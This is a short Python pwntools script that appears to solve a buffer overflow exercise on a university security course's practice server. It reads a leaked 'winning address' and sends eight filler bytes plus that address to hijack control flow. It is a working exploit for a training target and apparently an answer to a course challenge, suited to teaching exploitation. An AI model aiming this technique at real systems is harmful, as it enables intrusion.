#!/usr/bin/python

from pwn import *
import re

host = "practice.6447.sec.edu.au"
port = 4000

c = remote(host, port)
c.recvline()
reply = c.recvuntil("\n")
print(reply)
win = re.search("0x(.{7})", reply).group(0)
print("Winning address at %s" % (win))
win = int(win, 0)

payload = "a"*8
payload += p32(win) 

c.sendline(payload)

print(c.recvuntil("\n"))
print(c.recvuntil("\n"))
c.close()
